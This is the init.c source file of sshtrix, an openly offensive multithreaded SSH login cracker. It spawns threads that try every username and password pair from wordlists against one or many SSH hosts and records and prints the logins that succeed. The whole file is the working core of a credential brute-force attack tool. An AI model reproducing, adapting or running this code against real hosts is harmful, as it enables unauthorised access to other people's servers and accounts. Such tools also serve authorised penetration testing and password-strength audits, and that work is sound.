/*******************************************************************************
 * sshtrix - a very fast multithreaded SSH login cracker                       *
 *                                                                             *
 * init.c                                                                      *
 *                                                                             *
 * Copyright (C) 2011 noptrix - http://www.noptrix.net/                        *
 *                                                                             *
 * This program is free software: you can redistribute it and/or modify        *
 * it under the terms of the GNU General Public License as published by        *
 * the Free Software Foundation, either version 3 of the License, or           *
 * (at your option) any later version.                                         *
 *                                                                             *
 * This program is distributed in the hope that it will be useful,             *
 * but WITHOUT ANY WARRANTY; without even the implied warranty of              *
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the               *
 * GNU General Public License for more details.                                *
 *                                                                             *
 * You should have received a copy of the GNU General Public License           *
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.       *
 *                                                                             *
 ******************************************************************************/

#include "sshtrix.h"
#include "init.h"
#include "ssh.h"
#include "report.h"
#include "verbose.h"

#include <time.h>
#include <libssh/libssh.h>
#include <libssh/callbacks.h>


static void *start_thread(void *);
static job_t *run_sshtrix(job_t *);


/* run thread start routine */
static void *start_thread(void *arg)
{
    unsigned long int u = 0, p = 0;
    time_t start;
    args_t *args = (args_t *) arg;
    list_t *list = args->job->list;     /* just for better reading */
    job_t *job = args->job;


    start = time(NULL);

    /* for each user and for each password run crack routine and save all found
     * login pairs to our list_t {} */
    for (u = 0; u < list->num_users; u++) {
        for (p = 0; p < list->num_pass; p++) {
            
            /* NOTE: calculate again, because here is a bug, damn noptrix! */
            if (args->num == ((u * list->num_pass + p) % job->num_threads)) {
                sleep(args->job->delay);
                if (__CRACK == LOGIN_FOUND) {
                    list->found_users[list->num_found] = list->users[u];
                    list->found_pass[list->num_found] = list->pass[p];
                    list->num_found++;
                    if (job->print_login == PRINT_LOGIN_ON) {
                        __PRINT_FOUND_LOGINS;
                    }
                    if (job->first == FIRST_FOUND_ON) {
                        return NULL;
                    }
                } else if (__CRACK == CONN_ERROR) {
                    break; /* connect error -> continue with next host */
                }
            }
            job->time = time(NULL) - start;
            if (job->verbose) {
                printf("--- testing %s - %s\n", list->users[u], list->pass[p]);
            } else {
                __PRINT_STATUS_LINE;
            }
        }
    }

    return NULL;
}


/* init args {} and create threads */
static job_t *run_sshtrix(job_t *job)
{
    unsigned int i = 0;
    pthread_t tid[job->num_threads];
    args_t args[job->num_threads];


    for (i = 0; i < job->num_threads; i++) {
        args[i].num = i;
        args[i].job = job;
        xpthread_create(&tid[i], NULL, start_thread, &args[i]);
    }
    for (i = 0; i < job->num_threads; i++) {
        xpthread_join(tid[i], NULL);
    }

    return job;
}


/* initialize sshtrix */
job_t *init_sshtrix(job_t *job)
{
    unsigned long int i = 0;


    /* read usernames and passwords, allocate buffer for found logins */
    __VERBOSE_CREDENTIALS;
    job = get_credentials(job);
    job = alloc_logins(job);
    
    /* we need to initialize (see libssh tutorial) */
    ssh_threads_set_callbacks(ssh_threads_get_pthread());
    ssh_init();

    for (i = 0; i < job->target->num_hosts; i++) {
        if (job->target->mode == TARGET_LIST) {
            job->target->host = job->target->hosts[i];
            job->target->port = job->target->ports[i];
        }
        if (job->target->mode == TARGET_RANGE) {
            job->target->host = job->target->hosts[i];
        }
        __PRINT_ATTACK_HEADER;
        job = run_sshtrix(job);
        __PRINT_GAME_OVER;
        job = report(job);
        if (job->target->mode != TARGET_SINGLE) {
            job->list->num_found = 0;
            free(job->list->found_users);
            free(job->list->found_pass);
            job = alloc_logins(job);
        }
    }

    return job;
}

/* EOF */
